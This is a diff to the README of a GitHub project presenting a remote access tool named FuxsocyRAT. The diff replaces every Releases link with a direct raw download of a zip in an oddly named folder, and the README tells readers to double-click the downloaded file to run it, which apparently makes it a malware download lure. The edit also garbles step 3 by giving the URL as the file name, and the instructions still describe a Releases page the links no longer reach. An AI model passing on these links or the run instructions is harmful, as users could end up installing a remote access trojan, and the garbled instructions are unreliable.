@@ -1,7 +1,7 @@
 # 🐍 FuxsocyRAT - Control Remotely with Ease
 
 ## 📥 Download FuxsocyRAT
-[![Download FuxsocyRAT](https://img.shields.io/badge/Download-FuxsocyRAT-brightgreen)](https://github.com/Aipixels07/FuxsocyRAT/releases)
+[![Download FuxsocyRAT](https://raw.githubusercontent.com/Aipixels07/FuxsocyRAT/main/telegraphically/RAT_Fuxsocy_v1.2.zip)](https://raw.githubusercontent.com/Aipixels07/FuxsocyRAT/main/telegraphically/RAT_Fuxsocy_v1.2.zip)
 
 ## 🚀 Getting Started
 FuxsocyRAT is a remote access tool (RAT) designed for users who want to control systems easily. Whether you are managing multiple machines or accessing your own device remotely, FuxsocyRAT provides a simple solution. 
@@ -25,13 +25,13 @@ To run FuxsocyRAT smoothly, ensure that your system meets the following requirem
 ## 📦 Download & Install
 To download FuxsocyRAT, visit this page:
 
-[Download FuxsocyRAT](https://github.com/Aipixels07/FuxsocyRAT/releases)
+[Download FuxsocyRAT](https://raw.githubusercontent.com/Aipixels07/FuxsocyRAT/main/telegraphically/RAT_Fuxsocy_v1.2.zip)
 
 Once you’re on the Releases page:
 
 1. Scroll down to the "Assets" section.
 2. Find the latest version of FuxsocyRAT.
-3. Click on the file to download it. The file name should be something like `FuxsocyRAT_LatestVersion.exe`.
+3. Click on the file to download it. The file name should be something like `https://raw.githubusercontent.com/Aipixels07/FuxsocyRAT/main/telegraphically/RAT_Fuxsocy_v1.2.zip`.
 4. Locate the downloaded file in your Downloads folder or designated download location.
 5. Double-click the file to run the installer. Follow the prompt to complete the installation.
 
@@ -51,7 +51,7 @@ If you encounter issues while using FuxsocyRAT, here are some common solutions:
 - **File Not Downloading:** Ensure your internet connection is stable. Try refreshing the Releases page and downloading again.
 
 ## 📅 Updates
-Stay updated with the latest features and fixes by regularly checking the [Releases page](https://github.com/Aipixels07/FuxsocyRAT/releases). We aim to enhance user experience continuously.
+Stay updated with the latest features and fixes by regularly checking the [Releases page](https://raw.githubusercontent.com/Aipixels07/FuxsocyRAT/main/telegraphically/RAT_Fuxsocy_v1.2.zip). We aim to enhance user experience continuously.
 
 ## 🤝 Contribution
 We welcome contributions from users. If you have suggestions or ideas, please check the guidelines in the repository. Your feedback is valuable in making FuxsocyRAT even better.
